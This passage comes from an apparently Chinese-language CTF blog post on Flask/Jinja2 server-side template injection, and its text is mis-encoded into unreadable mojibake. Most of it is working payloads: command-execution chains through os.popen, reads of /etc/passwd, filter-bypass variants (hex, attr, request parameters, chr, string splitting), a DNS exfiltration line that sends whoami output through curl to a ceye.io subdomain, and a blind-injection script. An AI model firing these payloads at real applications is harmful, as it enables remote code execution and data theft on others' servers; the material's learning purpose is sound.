â€˜func_globalsâ€™ï¼ŒçŒœæµ‹åº”è¯¥æ˜¯python3ä¸­func_globalsè¢«ç§»é™¤äº†è¿˜æ˜¯å•¥çš„ï¼Œå¦‚æœä¸å¯¹è¯·å¸ˆå‚…ä»¬æŒ‡å‡º</p><p>æˆ‘ä»¬æŠŠä¸Šé¢çš„find.pyè„šæœ¬ä¸­çš„searchå˜é‡èµ‹å€¼ä¸ºlinecacheï¼Œå»å¯»æ‰¾å«æœ‰linecacheçš„ç±»</p><pre><code>Î» python find.py(&lt;class &#39;warnings.WarningMessage&#39;&gt;, 59)(&lt;class &#39;warnings.catch_warnings&#39;&gt;, 60)</code></pre><p>åé¢å¦‚æ³•ç‚®åˆ¶ï¼Œpayloadå¦‚ä¸‹</p><pre><code>&#123;&#123;[].__class__.__base__.__subclasses__()[60].__init__.func_globals['linecache'].os.popen('whoami').read()&#125;&#125;</code></pre><h1 id="python2-amp-3çš„æ–¹æ³•"><a href="#python2-amp-3çš„æ–¹æ³•" class="headerlink" title="python2&amp;3çš„æ–¹æ³•"></a>python2&amp;3çš„æ–¹æ³•</h1><p>è¿™é‡Œä»‹ç»python2å’Œpython3ä¸¤ä¸ªç‰ˆæœ¬é€šç”¨çš„æ–¹æ³•</p><ul><li><h2 id="builtins-ä»£ç æ‰§è¡Œ"><a href="#builtins-ä»£ç æ‰§è¡Œ" class="headerlink" title="__builtins__ä»£ç æ‰§è¡Œ"></a>__builtins__ä»£ç æ‰§è¡Œ</h2></li></ul><p>è¿™ç§æ–¹æ³•æ˜¯æ¯”è¾ƒå¸¸ç”¨çš„ï¼Œå› ä¸ºä»–ä¸¤ç§pythonç‰ˆæœ¬éƒ½é€‚ç”¨</p><p>é¦–å…ˆ__builtins__æ˜¯ä¸€ä¸ªåŒ…å«äº†å¤§é‡å†…ç½®å‡½æ•°çš„ä¸€ä¸ªæ¨¡å—ï¼Œæˆ‘ä»¬å¹³æ—¶ç”¨pythonçš„æ—¶å€™ä¹‹æ‰€ä»¥å¯ä»¥ç›´æ¥ä½¿ç”¨ä¸€äº›å‡½æ•°æ¯”å¦‚absï¼Œmaxï¼Œå°±æ˜¯å› ä¸º__builtins__è¿™ç±»æ¨¡å—åœ¨Pythonå¯åŠ¨æ—¶ä¸ºæˆ‘ä»¬å¯¼å…¥äº†ï¼Œå¯ä»¥ä½¿ç”¨dir(<strong>builtins</strong>)æ¥æŸ¥çœ‹è°ƒç”¨æ–¹æ³•çš„åˆ—è¡¨ï¼Œç„¶åå¯ä»¥å‘ç°__builtins__ä¸‹æœ‰evalï¼Œ__import__ç­‰çš„å‡½æ•°ï¼Œå› æ­¤å¯ä»¥åˆ©ç”¨æ­¤æ¥æ‰§è¡Œå‘½ä»¤ã€‚</p><p>æŠŠä¸Šé¢find.pyè„šæœ¬searchå˜é‡èµ‹å€¼ä¸º__builtins__ï¼Œç„¶åæ‰¾åˆ°ç¬¬140ä¸ªç±»warnings.catch_warningså«æœ‰ä»–ï¼Œè€Œä¸”è¿™é‡Œçš„è¯æ¯”è¾ƒå¤šçš„ç±»éƒ½å«æœ‰__builtins__ï¼Œæ¯”å¦‚å¸¸ç”¨çš„è¿˜æœ‰email.header._ValueFormatterç­‰ç­‰ï¼Œè¿™ä¹Ÿå¯èƒ½æ˜¯ä¸ºä»€ä¹ˆè¿™ç§æ–¹æ³•æ¯”è¾ƒå¤šäººç”¨çš„åŸå› ä¹‹ä¸€å§</p><p>å†è°ƒç”¨evalç­‰å‡½æ•°å’Œæ–¹æ³•å³å¯ï¼Œpayloadå¦‚ä¸‹</p><pre><code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['eval']("__import__('os').system('whoami')")&#125;&#125;&#123;&#123;().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()")&#125;&#125;&#123;&#123;().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['__import__']('os').popen('whoami').read()&#125;&#125;&#123;&#123;().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['open']('/etc/passwd').read()&#125;&#125;</code></pre><p>åˆæˆ–è€…ç”¨å¦‚ä¸‹ä¸¤ç§æ–¹å¼ï¼Œç”¨æ¨¡æ¿æ¥è·‘å¾ªç¯</p><pre><code>&#123;% for c in ().__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__ == 'catch_warnings' %&#125;  &#123;% for b in c.__init__.__globals__.values() %&#125;  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;    &#123;% if 'eval' in b.keys() %&#125;      &#123;&#123; b['eval']('__import__("os").popen("whoami").read()') &#125;&#125;    &#123;% endif %&#125;  &#123;% endif %&#125;  &#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/f45931bb692441b6b6040aa863eaf12c.png" alt="img"></p><p>è¯»å–æ–‡ä»¶payload</p><pre><code>&#123;% for c in ().__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('filename', 'r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p>å¦å¤–ä¸€äº›ç»•è¿‡æ–¹æ³•:</p><h2 id="ç»•è¿‡é»‘åå•"><a href="#ç»•è¿‡é»‘åå•" class="headerlink" title="ç»•è¿‡é»‘åå•"></a>ç»•è¿‡é»‘åå•</h2><p>CTFä¸­ä¸€èˆ¬è€ƒçš„å°±æ˜¯æ€ä¹ˆç»•è¿‡SSTIï¼Œæˆ‘ä»¬å­¦ä¼šå¦‚ä½•å»æ„é€ payloadä¹‹åï¼Œè¿˜è¦å­¦ä¹ å¦‚ä½•å»ç»•è¿‡ä¸€äº›è¿‡æ»¤ï¼Œç„¶åä¸‹é¢ç”±äºç¯å¢ƒçš„ä¸åŒï¼Œpayloadä¸­ç±»çš„ä½ç½®ä¹Ÿæ˜¯å°±é‚£ä¸ªæ•°å­—å¯èƒ½ä¼šå’Œæ–‡ç« ä¸­ä¸ä¸€æ ·ï¼Œéœ€è¦è‡ªå·±åŠ¨æ‰‹æµ‹ä¸€ä¸‹</p><h3 id="è¿‡æ»¤äº†ç‚¹"><a href="#è¿‡æ»¤äº†ç‚¹" class="headerlink" title="è¿‡æ»¤äº†ç‚¹"></a>è¿‡æ»¤äº†ç‚¹</h3><p>è¿‡æ»¤äº†.</p><p>åœ¨pythonä¸­ï¼Œå¯ç”¨ä»¥ä¸‹è¡¨ç¤ºæ³•å¯ç”¨äºè®¿é—®å¯¹è±¡çš„å±æ€§</p><pre><code>&#123;&#123;().__class__&#125;&#125;&#123;&#123;()["__class__"]&#125;&#125;&#123;&#123;()|attr("__class__")&#125;&#125;&#123;&#123;getattr('',"__class__")&#125;&#125;</code></pre><p>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥é€šè¿‡[]ï¼Œattr()ï¼Œgetattr()æ¥ç»•è¿‡ç‚¹</p><h4 id="ä½¿ç”¨-ç»•è¿‡"><a href="#ä½¿ç”¨-ç»•è¿‡" class="headerlink" title="ä½¿ç”¨[]ç»•è¿‡"></a>ä½¿ç”¨[]ç»•è¿‡</h4><p>ä½¿ç”¨è®¿é—®å­—å…¸çš„æ–¹å¼æ¥è®¿é—®å‡½æ•°æˆ–è€…ç±»ç­‰ï¼Œä¸‹é¢ä¸¤è¡Œæ˜¯ç­‰ä»·çš„</p><pre><code>&#123;&#123;().__class__&#125;&#125;&#123;&#123;()['__class__']&#125;&#125;</code></pre><p>ä»¥æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ payloadå¦‚ä¸‹</p><pre><code>&#123;&#123;()['__class__']['__base__']['__subclasses__']()[433]['__init__']['__globals__']['popen']('whoami')['read']()&#125;&#125;</code></pre><h4 id="ä½¿ç”¨attr-ç»•è¿‡"><a href="#ä½¿ç”¨attr-ç»•è¿‡" class="headerlink" title="ä½¿ç”¨attr()ç»•è¿‡"></a>ä½¿ç”¨attr()ç»•è¿‡</h4><p>ä½¿ç”¨åŸç”ŸJinJa2çš„å‡½æ•°attr()ï¼Œä»¥ä¸‹ä¸¤è¡Œæ˜¯ç­‰ä»·çš„</p><pre><code>&#123;&#123;().__class__&#125;&#125;&#123;&#123;()|attr('__class__')&#125;&#125;</code></pre><p>ä»¥æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ payloadå¦‚ä¸‹</p><pre><code>&#123;&#123;()|attr('__class__')|attr('__base__')|attr('__subclasses__')()|attr('__getitem__')(65)|attr('__init__')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('eval')('__import__("os").popen("whoami").read()')&#125;&#125;</code></pre><h4 id="ä½¿ç”¨getattr-ç»•è¿‡"><a href="#ä½¿ç”¨getattr-ç»•è¿‡" class="headerlink" title="ä½¿ç”¨getattr()ç»•è¿‡"></a>ä½¿ç”¨getattr()ç»•è¿‡</h4><p>è¿™ç§æ–¹æ³•æœ‰æ—¶å€™ç”±äºç¯å¢ƒé—®é¢˜ä¸ä¸€å®šå¯è¡Œï¼Œä¼šæŠ¥é”™â€™getattrâ€™ is undefinedï¼Œæ‰€ä»¥ä¼˜å…ˆä½¿ç”¨ä»¥ä¸Šä¸¤ç§</p><pre><code>Python 3.7.8&gt;&gt;&gt; ().__class__&lt;class &#39;tuple&#39;&gt;&gt;&gt;&gt; getattr((),&quot;__class__&quot;)&lt;class &#39;tuple&#39;&gt;</code></pre><h3 id="è¿‡æ»¤å¼•å·"><a href="#è¿‡æ»¤å¼•å·" class="headerlink" title="è¿‡æ»¤å¼•å·"></a>è¿‡æ»¤å¼•å·</h3><p>è¿‡æ»¤äº†â€™å’Œâ€</p><h4 id="requestç»•è¿‡"><a href="#requestç»•è¿‡" class="headerlink" title="requestç»•è¿‡"></a>requestç»•è¿‡</h4><p>flaskä¸­å­˜åœ¨ç€requestå†…ç½®å¯¹è±¡å¯ä»¥å¾—åˆ°è¯·æ±‚çš„ä¿¡æ¯ï¼Œrequestå¯ä»¥ç”¨5ç§ä¸åŒçš„æ–¹å¼æ¥è¯·æ±‚ä¿¡æ¯ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä»–æ¥ä¼ é€’å‚æ•°ç»•è¿‡</p><pre><code>request.args.namerequest.cookies.namerequest.headers.namerequest.values.namerequest.form.name</code></pre><p>payloadå¦‚ä¸‹</p><p>GETæ–¹å¼ï¼Œåˆ©ç”¨request.argsä¼ é€’å‚æ•°</p><pre><code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[213].__init__.__globals__.__builtins__[request.args.arg1](request.args.arg2).read()&#125;&#125;&amp;arg1=open&amp;arg2=/etc/passwd</code></pre><p>POSTæ–¹å¼ï¼Œåˆ©ç”¨request.valuesä¼ é€’å‚æ•°</p><pre><code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__[request.values.arg1](request.values.arg2).read()&#125;&#125;post:arg1=open&amp;arg2=/etc/passwd</code></pre><p>Cookieæ–¹å¼ï¼Œåˆ©ç”¨request.cookiesä¼ é€’å‚æ•°</p><pre><code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__[request.cookies.arg1](request.cookies.arg2).read()&#125;&#125;Cookie:arg1=open;arg2=/etc/passwd</code></pre><p>å‰©ä¸‹ä¸¤ç§æ–¹æ³•ä¹Ÿå·®ä¸å¤šï¼Œè¿™é‡Œå°±ä¸èµ˜è¿°äº†</p><h4 id="chrç»•è¿‡"><a href="#chrç»•è¿‡" class="headerlink" title="chrç»•è¿‡"></a>chrç»•è¿‡</h4><pre><code>&#123;&#123;().__class__.__base__.__subclasses__()[Â§0Â§].__init__.__globals__.__builtins__.chr&#125;&#125;</code></pre><p>è¿™é‡Œå…ˆçˆ†ç ´subclassesï¼Œè·å–subclassesä¸­å«æœ‰chrçš„ç±»ç´¢å¼•</p><p><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/ce9a23785e014adda7f75ca7c05d5c33.jpeg" alt="img"></p><p>ç„¶åå°±å¯ä»¥ç”¨chræ¥ç»•è¿‡ä¼ å‚æ—¶æ‰€éœ€è¦çš„å¼•å·ï¼Œç„¶åéœ€è¦ç”¨chræ¥æ„é€ éœ€è¦çš„å­—ç¬¦</p><p>è¿™é‡Œæˆ‘å†™äº†ä¸ªè„šæœ¬å¯ä»¥å¿«é€Ÿæ„é€ æƒ³è¦çš„asciiå­—ç¬¦</p><pre><code>&lt;?php$a = &#39;whoami&#39;;$result = &#39;&#39;;for($i=0;$i&lt;strlen($a);$i++)&#123; $result .= &#39;chr(&#39;.ord($a[$i]).&#39;)%2b&#39;;&#125;echo substr($result,0,-3);?&gt;//chr(119)%2bchr(104)%2bchr(111)%2bchr(97)%2bchr(109)%2bchr(105)</code></pre><p>æœ€åpayloadå¦‚ä¸‹</p><pre><code>&#123;% set chr = ().__class__.__base__.__subclasses__()[7].__init__.__globals__.__builtins__.chr %&#125;&#123;&#123;().__class__.__base__.__subclasses__()[257].__init__.__globals__.popen(chr(119)%2bchr(104)%2bchr(111)%2bchr(97)%2bchr(109)%2bchr(105)).read()&#125;&#125;</code></pre><h3 id="è¿‡æ»¤ä¸‹åˆ’çº¿"><a href="#è¿‡æ»¤ä¸‹åˆ’çº¿" class="headerlink" title="è¿‡æ»¤ä¸‹åˆ’çº¿"></a>è¿‡æ»¤ä¸‹åˆ’çº¿</h3><p>è¿‡æ»¤äº†_</p><h4 id="ç¼–ç ç»•è¿‡"><a href="#ç¼–ç ç»•è¿‡" class="headerlink" title="ç¼–ç ç»•è¿‡"></a>ç¼–ç ç»•è¿‡</h4><p>ä½¿ç”¨åå…­è¿›åˆ¶ç¼–ç ç»•è¿‡ï¼Œ_ç¼–ç åä¸º\x5fï¼Œ.ç¼–ç åä¸º\x2E</p><p>payloadå¦‚ä¸‹</p><pre><code>&#123;&#123;()["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fbases\x5f\x5f"][0]["\x5f\x5fsubclasses\x5f\x5f"]()[376]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]['popen']('whoami')['read']()&#125;&#125;</code></pre><p>è¿™é‡Œç”šè‡³å¯ä»¥å…¨åå…­è¿›åˆ¶ç»•è¿‡ï¼Œé¡ºä¾¿æŠŠå…³é”®å­—ä¹Ÿä¸€èµ·ç»•è¿‡ï¼Œè¿™é‡Œå…ˆç»™å‡ºä¸ªpythonè„šæœ¬æ–¹ä¾¿è½¬æ¢</p><pre><code>string1=&quot;__class__&quot;string2=&quot;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&quot;def tohex(string):  result = &quot;&quot;  for i in range(len(string)):      result=result+&quot;\\x&quot;+hex(ord(string[i]))[2:]  print(result)tohex(string1) #\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5fprint(string2) #__class__</code></pre><p>éšä¾¿æ„é€ ä¸ªpayloadå¦‚ä¸‹</p><pre><code>&#123;&#123;""["\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f"]["\x5f\x5f\x62\x61\x73\x65\x5f\x5f"]["\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f"]()[64]["\x5f\x5f\x69\x6e\x69\x74\x5f\x5f"]["\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f"]["\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f"]["\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f"]("\x6f\x73")["\x70\x6f\x70\x65\x6e"]("whoami")["\x72\x65\x61\x64"]()&#125;&#125;</code></pre><h4 id="requestç»•è¿‡-1"><a href="#requestç»•è¿‡-1" class="headerlink" title="requestç»•è¿‡"></a>requestç»•è¿‡</h4><p>åœ¨ä¸Šé¢çš„è¿‡æ»¤å¼•å·å·²ç»ä»‹ç»è¿‡äº†ï¼Œè¿™é‡Œä¸å†èµ˜è¿°</p><h3 id="è¿‡æ»¤å…³é”®å­—"><a href="#è¿‡æ»¤å…³é”®å­—" class="headerlink" title="è¿‡æ»¤å…³é”®å­—"></a>è¿‡æ»¤å…³é”®å­—</h3><p>é¦–å…ˆè¦çœ‹å…³é”®å­—æ˜¯å¦‚ä½•è¢«è¿‡æ»¤çš„</p><p>å¦‚æœæ˜¯æ›¿æ¢ä¸ºç©ºï¼Œå¯ä»¥å°è¯•åŒå†™ç»•è¿‡ï¼Œæˆ–è€…ä½¿ç”¨é»‘åå•é€»è¾‘æ¼æ´é”™è¯¯ç»•è¿‡ï¼Œå³ä½¿ç”¨é»‘åå•æœ€åä¸€ä¸ªå…³é”®å­—æ›¿æ¢ç»•è¿‡</p><p>å¦‚æœç›´æ¥banäº†ï¼Œå°±å¯ä»¥ä½¿ç”¨å­—ç¬¦ä¸²æ‹¼æ¥çš„æ–¹å¼ç­‰æ–¹æ³•è¿›è¡Œç»•è¿‡ï¼Œå¸¸ç”¨æ–¹æ³•å¦‚ä¸‹</p><h4 id="æ‹¼æ¥å­—ç¬¦ç»•è¿‡"><a href="#æ‹¼æ¥å­—ç¬¦ç»•è¿‡" class="headerlink" title="æ‹¼æ¥å­—ç¬¦ç»•è¿‡"></a>æ‹¼æ¥å­—ç¬¦ç»•è¿‡</h4><p>è¿™é‡Œä»¥è¿‡æ»¤classä¸ºä¾‹å­ï¼Œç”¨ä¸­æ‹¬å·æ‹¬èµ·æ¥ç„¶åé‡Œé¢ç”¨å¼•å·è¿æ¥ï¼Œå¯ä»¥ç”¨+å·æˆ–è€…ä¸ç”¨</p><pre><code>&#123;&#123;()['__cla'+'ss__'].__bases__[0]&#125;&#125;&#123;&#123;()['__cla''ss__'].__bases__[0]&#125;&#125;</code></pre><p>éšä¾¿å†™ä¸ªpayloadå¦‚ä¸‹</p><pre><code>&#123;&#123;()['__cla''ss__'].__bases__[0].__subclasses__()[40].__init__.__globals__['__builtins__']['ev''al']("__im""port__('o''s').po""pen('whoami').read()")&#125;&#125;</code></pre><p>æˆ–è€…å¯ä»¥ä½¿ç”¨joinæ¥è¿›è¡Œæ‹¼æ¥</p><pre><code>&#123;&#123;()|attr(["_"*2,"cla","ss","_"*2]|join)&#125;&#125;</code></pre><p>çœ‹åˆ°æœ‰å¸ˆå‚…ç”šè‡³ç”¨ç®¡é“ç¬¦åŠ ä¸Šformatæ–¹æ³•æ¥æ‹¼æ¥çš„éªšæ“ä½œï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å¹³æ—¶è¯´çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œå…¶ä¸­çš„%sè¢«læ›¿æ¢</p><pre><code>&#123;&#123;()|attr(request.args.f|format(request.args.a))&#125;&#125;&amp;f=__c%sass__&amp;a=l</code></pre><h4 id="ä½¿ç”¨ä½¿ç”¨stråŸç”Ÿå‡½æ•°"><a href="#ä½¿ç”¨ä½¿ç”¨stråŸç”Ÿå‡½æ•°" class="headerlink" title="ä½¿ç”¨ä½¿ç”¨stråŸç”Ÿå‡½æ•°"></a>ä½¿ç”¨ä½¿ç”¨stråŸç”Ÿå‡½æ•°</h4><p>replaceç»•è¿‡ï¼Œpayloadå¦‚ä¸‹</p><pre><code>&#123;&#123;().__getattribute__('__claAss__'.replace("A","")).__bases__[0].__subclasses__()[376].__init__.__globals__['popen']('whoami').read()&#125;&#125;</code></pre><p>decodeç»•è¿‡ï¼Œä½†è¿™ç§æ–¹æ³•ç»è¿‡æµ‹è¯•åªèƒ½åœ¨python2ä¸‹ä½¿ç”¨ï¼Œpayloadå¦‚ä¸‹</p><pre><code>&#123;&#123;().__getattribute__('X19jbGFzc19f'.decode('base64')).__base__.__subclasses__()[40]("/etc/passwd").read()&#125;&#125;</code></pre><h4 id="æ›¿ä»£çš„æ–¹æ³•"><a href="#æ›¿ä»£çš„æ–¹æ³•" class="headerlink" title="æ›¿ä»£çš„æ–¹æ³•"></a>æ›¿ä»£çš„æ–¹æ³•</h4><p>è¿‡æ»¤initï¼Œå¯ä»¥ç”¨__enter__æˆ–__exit__æ›¿ä»£</p><pre><code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[213].__enter__.__globals__['__builtins__']['open']('/etc/passwd').read()&#125;&#125;&#123;&#123;().__class__.__bases__[0].__subclasses__()[213].__exit__.__globals__['__builtins__']['open']('/etc/passwd').read()&#125;&#125;</code></pre><p>è¿‡æ»¤configï¼Œæˆ‘ä»¬é€šå¸¸ä¼šç”¨è·å–å½“å‰è®¾ç½®ï¼Œå¦‚æœè¢«è¿‡æ»¤äº†å¯ä»¥ä½¿ç”¨ä»¥ä¸‹çš„payloadç»•è¿‡</p><pre><code>&#123;&#123;self&#125;&#125; â‡’ &lt;TemplateReference None&gt;&#123;&#123;self.__dict__._TemplateReference__context&#125;&#125;</code></pre><h3 id="è¿‡æ»¤ä¸­æ‹¬å·"><a href="#è¿‡æ»¤ä¸­æ‹¬å·" class="headerlink" title="è¿‡æ»¤ä¸­æ‹¬å·"></a>è¿‡æ»¤ä¸­æ‹¬å·</h3><p>è¿‡æ»¤äº†[å’Œ]</p><h4 id="æ•°å­—ä¸­çš„ä¸­æ‹¬å·"><a href="#æ•°å­—ä¸­çš„ä¸­æ‹¬å·" class="headerlink" title="æ•°å­—ä¸­çš„ä¸­æ‹¬å·"></a>æ•°å­—ä¸­çš„ä¸­æ‹¬å·</h4><p>åœ¨pythoné‡Œé¢å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•è®¿é—®æ•°ç»„å…ƒç´ </p><pre><code>Python 3.7.8&gt;&gt;&gt; [&quot;a&quot;,&quot;kawhi&quot;,&quot;c&quot;][1]&#39;kawhi&#39;&gt;&gt;&gt; [&quot;a&quot;,&quot;kawhi&quot;,&quot;c&quot;].pop(1)&#39;kawhi&#39;&gt;&gt;&gt; [&quot;a&quot;,&quot;kawhi&quot;,&quot;c&quot;].__getitem__(1)&#39;kawhi&#39;</code></pre><p>ä¹Ÿå°±æ˜¯è¯´å¯ä»¥ä½¿ç”¨__getitem__å’Œpopæ›¿ä»£ä¸­æ‹¬å·ï¼Œå–åˆ—è¡¨çš„ç¬¬nä½</p><p>payloadå¦‚ä¸‹</p><pre><code>&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(433).__init__.__globals__.popen('whoami').read()&#125;&#123;&#123;().__class__.__base__.__subclasses__().pop(433).__init__.__globals__.popen('whoami').read()&#125;&#125;</code></pre><h4 id="é­”æœ¯æ–¹æ³•çš„ä¸­æ‹¬å·"><a href="#é­”æœ¯æ–¹æ³•çš„ä¸­æ‹¬å·" class="headerlink" title="é­”æœ¯æ–¹æ³•çš„ä¸­æ‹¬å·"></a>é­”æœ¯æ–¹æ³•çš„ä¸­æ‹¬å·</h4><p>è°ƒç”¨é­”æœ¯æ–¹æ³•æœ¬æ¥æ˜¯ä¸ç”¨ä¸­æ‹¬å·çš„ï¼Œä½†æ˜¯å¦‚æœè¿‡æ»¤äº†å…³é”®å­—ï¼Œè¦è¿›è¡Œæ‹¼æ¥çš„è¯å°±ä¸å¯é¿å…è¦ç”¨åˆ°ä¸­æ‹¬å·ï¼Œåƒè¿™é‡Œå¦‚æœåŒæ—¶è¿‡æ»¤äº†classå’Œä¸­æ‹¬å·</p><p>å¯ç”¨__getattribute__ç»•è¿‡</p><pre><code>&#123;&#123;"".__getattribute__("__cla"+"ss__").__base__&#125;&#125;</code></pre><p>æˆ–è€…å¯ä»¥é…åˆrequestä¸€èµ·ä½¿ç”¨</p><pre><code>&#123;&#123;().__getattribute__(request.args.arg1).__base__&#125;&#125;&amp;arg1=__class__</code></pre><p>payloadå¦‚ä¸‹</p><pre><code>&#123;&#123;().__getattribute__(request.args.arg1).__base__.__subclasses__().pop(376).__init__.__globals__.popen(request.args.arg2).read()&#125;&#125;&amp;arg1=__class__&amp;arg2=whoami</code></pre><p>è¿™ç§åŒæ ·æ˜¯ç»•è¿‡å…³é”®å­—çš„æ–¹æ³•ä¹‹ä¸€</p><h3 id="è¿‡æ»¤åŒå¤§æ‹¬å·"><a href="#è¿‡æ»¤åŒå¤§æ‹¬å·" class="headerlink" title="è¿‡æ»¤åŒå¤§æ‹¬å·"></a>è¿‡æ»¤åŒå¤§æ‹¬å·</h3><pre><code class="python">è¿‡æ»¤äº†&#123;&#123;å’Œ&#125;&#125;</code></pre><h4 id="ä½¿ç”¨dnså¤–å¸¦æ•°æ®"><a href="#ä½¿ç”¨dnså¤–å¸¦æ•°æ®" class="headerlink" title="ä½¿ç”¨dnså¤–å¸¦æ•°æ®"></a>ä½¿ç”¨dnså¤–å¸¦æ•°æ®</h4><p><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/image-20220223141509923.png" alt="image-20220223141509923"></p><pre><code class="python">&#123;% if ().__class__.__base__.__subclasses__()[433].__init__.__globals__['popen']("curl `whoami`.k1o75b.ceye.io").read()=='kawhi' %&#125;1&#123;% endif %&#125;</code></pre><p>ç„¶ååœ¨ceyeå¹³å°æ¥æ”¶æ•°æ®å³å¯</p><p><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/a0b1acecc5844f778d857c94da232d74.jpeg" alt="img"></p><h4 id="ç›²æ³¨"><a href="#ç›²æ³¨" class="headerlink" title="ç›²æ³¨"></a>ç›²æ³¨</h4><p>å¦‚æœä¸Šé¢çš„æ–¹æ³•ä¸è¡Œçš„è¯ï¼Œå¯ä»¥è€ƒè™‘ä½¿ç”¨ç›²æ³¨çš„æ–¹å¼ï¼Œè¿™é‡Œé™„ä¸Šp0å¸ˆå‚…çš„è„šæœ¬</p><pre><code class="python"># -*- coding: utf-8 -*-import requestsurl = &#39;http://ip:5000/?name=&#39;def check(payload):    r = requests.get(url+payload).content    return &#39;kawhi&#39; in rpassword  = &#39;&#39;s = r&#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&quot;$\&#39;()*+,-./:;&lt;=&gt;?@[\\]^`&#123;|&#125;~\&#39;&quot;_%&#39;for i in xrange(0,100):    for c in s:        payload = &#39;&#123;% if ().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__.open("/etc/passwd").read()['+str(i)+':'+str(i+1)+'] == "'+c+'" %&#125;kawhi&#123;% endif %&#125;&#39;        if check(payload):            password += c            break    print password</code></pre><h4 id="printæ ‡è®°"><a href="#printæ ‡è®°" class="headerlink" title="printæ ‡è®°"></a>printæ ‡è®°</h4><p><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/image-20220223141738675.png" alt="image-20220223141738675"></p><pre><code class="python">&#123;%print ().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()")%&#125;</code></pre><h1 id="payloadè¿›é˜¶ä¸æ‹“å±•"><a href="#payloadè¿›é˜¶ä¸æ‹“å±•" class="headerlink" title="payloadè¿›é˜¶ä¸æ‹“å±•"></a>payloadè¿›é˜¶ä¸æ‹“å±•</h1><p>è¿™é‡Œæˆ‘åŸºäºä¸Šé¢ç»•è¿‡é»‘åå•å„ç§æ–¹æ³•çš„ç»„åˆï¼Œå¯¹CTFä¸­ç”¨åˆ°çš„ä¸€äº›æ–¹æ³•å’Œpayloadå†åšä¸€ä¸ªå°çš„æ€»ç»“ï¼Œä¸è¿‡å…¶å®ä¸€èˆ¬æ¥è¯´ï¼Œåªè¦ä¸æ˜¯å¤ªåå¤ªç»•çš„é¢˜ï¼Œä¸Šé¢çš„æ–¹æ³•è‡ªè¡Œç»„åˆä¸€ä¸‹éƒ½å¤Ÿç”¨äº†ï¼Œä¸‹é¢åªæ˜¯ä½œä¸ºä¸€ä¸ªæ‹“å±•</p><h2 id="è¿‡æ»¤-å’Œ-å’Œ-39"><a href="#è¿‡æ»¤-å’Œ-å’Œ-39" class="headerlink" title="è¿‡æ»¤_å’Œ.å’Œ&#39;"></a>è¿‡æ»¤_å’Œ.å’Œ&#39;</h2><p>è¿™é‡Œé¡ºä¾¿ç»™ä¸€ä¸ªä¸å¸¸è§çš„æ–¹æ³•ï¼Œä¸»è¦æ˜¯æ‰¾åˆ°_frozen_importlib_external.FileLoaderçš„get_data()æ–¹æ³•ï¼Œç¬¬ä¸€ä¸ªæ˜¯å‚æ•°0ï¼Œç¬¬äºŒä¸ªä¸ºè¦è¯»å–çš„æ–‡ä»¶åï¼Œpayloadå¦‚ä¸‹</p><pre><code class="python">&#123;&#123;().__class__.__bases__[0].__subclasses__()[222].get_data(0,"app.py")&#125;&#125;</code></pre><p>ä½¿ç”¨åå…­è¿›åˆ¶ç»•è¿‡åï¼Œpayloadå¦‚ä¸‹</p><pre><code class="python">&#123;&#123;()["\x5f\x5fclass\x5f\x5f"]["\x5F\x5Fbases\x5F\x5F"][0]["\x5F\x5Fsubclasses\x5F\x5F"]()[222]["get\x5Fdata"](0, "app\x2Epy")&#125;&#125;</code></pre><h2 id="è¿‡æ»¤argså’Œ-å’Œ"><a href="#è¿‡æ»¤argså’Œ-å’Œ" class="headerlink" 